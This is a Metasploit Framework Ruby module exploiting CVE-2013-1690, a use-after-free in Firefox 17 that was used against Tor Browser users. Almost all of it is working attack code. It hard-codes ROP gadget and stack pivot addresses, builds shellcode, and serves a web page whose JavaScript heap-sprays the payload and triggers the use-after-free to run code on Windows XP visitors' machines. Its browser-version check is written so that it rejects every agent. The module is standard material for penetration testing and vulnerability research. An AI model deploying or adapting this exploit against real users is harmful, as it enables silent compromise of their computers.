# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox onreadystatechange Event DocumentViewerImpl Use After Free&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found on Firefox 17.0.6, specifically an use
        after free of a DocumentViewerImpl object, triggered via an specially crafted web
        page using onreadystatechange events and the window.stop() API, as exploited in the
        wild on 2013 August to target Tor Browser users.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Nils&#039;,        # vulnerability discovery
          &#039;Unknown&#039;,     # 1day exploit, prolly the FBI
          &#039;w3bd3vil&#039;,    # 1day analysis
          &#039;sinn3r&#039;,      # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-1690&#039; ],
          [ &#039;OSVDB&#039;, &#039;94584&#039;],
          [ &#039;BID&#039;, &#039;60778&#039;],
          [ &#039;URL&#039;, &#039;https://www.mozilla.org/security/announce/2013/mfsa2013-53.html&#039; ],
          [ &#039;URL&#039;, &#039;https://lists.torproject.org/pipermail/tor-announce/2013-August/000089.html&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=901365&#039; ],
          [ &#039;URL&#039;, &#039;http://krash.in/ffn0day.txt&#039; ],
          [ &#039;URL&#039;, &#039;http://hg.mozilla.org/releases/mozilla-esr17/rev/2d5a85d7d3ae&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;       => "\x00",
          &#039;DisableNops&#039;    => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Firefox 17 & Firefox 21 / Windows XP SP3&#039;,
            {
              &#039;FakeObject&#039; => 0x0c101008, # Pointer to the Sprayed Memory
              &#039;RetGadget&#039;  => 0x77c3ee16, # ret from msvcrt
              &#039;StackPivot&#039; => 0x76C9B4C2, # xcht ecx,esp # or byte ptr[eax], al # add byte ptr [edi+5Eh], bl # ret 8 from IMAGEHLP
              &#039;VFuncPtr&#039;   => 0x0c10100c  # Fake Function Pointer to the Sprayed Memory
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 25 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
  end
 
  def stack_pivot
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end
 
  def junk(n=4)
    return rand_text_alpha(n).unpack("V").first
  end
 
  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    vprint_status("Agent: #{agent}")
 
    if agent !~ /Windows NT 5\.1/
      print_error("Windows XP not found, sending 404: #{agent}")
      send_not_found(cli)
      return
    end
 
    if agent !~ /Firefox\/17/ or agent !~ /Firefox\/21/
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end
 
    my_uri = (&#039;/&#039; == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
 
    # build html
    code = [
      target[&#039;VFuncPtr&#039;],
      target[&#039;RetGadget&#039;],
      target[&#039;StackPivot&#039;],
      junk
    ].pack("V*")
    code << generate_rop_payload(&#039;msvcrt&#039;, stack_pivot + payload.encoded, {&#039;target&#039;=>&#039;xp&#039;})
    js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))
    js_random = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(target.arch))
 
    content = <<-HTML
<html>
<body>
<iframe src="#{my_uri}/iframe.html"></iframe>
</body></html>
    HTML
 
    # build iframe
    iframe = <<-IFRAME
<script>
var z="<body><img src=&#039;nonexistant.html&#039; onerror=\\"\\" ></body>";
var test = new Array();
var heap_chunks;
function heapSpray(shellcode, fillsled) {
  var chunk_size, headersize, fillsled_len, code;
  var i, codewithnum;
  chunk_size = 0x40000;
  headersize = 0x10;
  fillsled_len = chunk_size - (headersize + shellcode.length);
  while (fillsled.length <fillsled_len)
    fillsled += fillsled;
  fillsled = fillsled.substring(0, fillsled_len);
  code = shellcode + fillsled;
  heap_chunks = new Array();
  for (i = 0; i<1000; i++)
  {
    codewithnum = "HERE" + code;
    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
  }
}
 
 
function b() {
  for(var c=0;1024>c;c++) {
    test[c]=new ArrayBuffer(180);
    bufView = new Uint32Array(test[c]);
    for (var i=0; i < 45; i++) {
      bufView[i] = #{target[&#039;FakeObject&#039;]};
    }
  }
}
 
function a() {
  window.stop();
  var myshellcode = unescape("#{js_code}");
  var myfillsled = unescape("#{js_random}");
  heapSpray(myshellcode,myfillsled);
  b();
  window.parent.frames[0].frameElement.ownerDocument.write(z);
}
 
document.addEventListener("readystatechange",a,null);
</script>
    IFRAME
 
    print_status("URI #{request.uri} requested...")
 
    if request.uri =~ /iframe\.html/
      print_status("Sending iframe HTML")
      send_response(cli, iframe, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
      return
    end
 
    print_status("Sending HTML")
    send_response(cli, content, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
 
  end
 
end

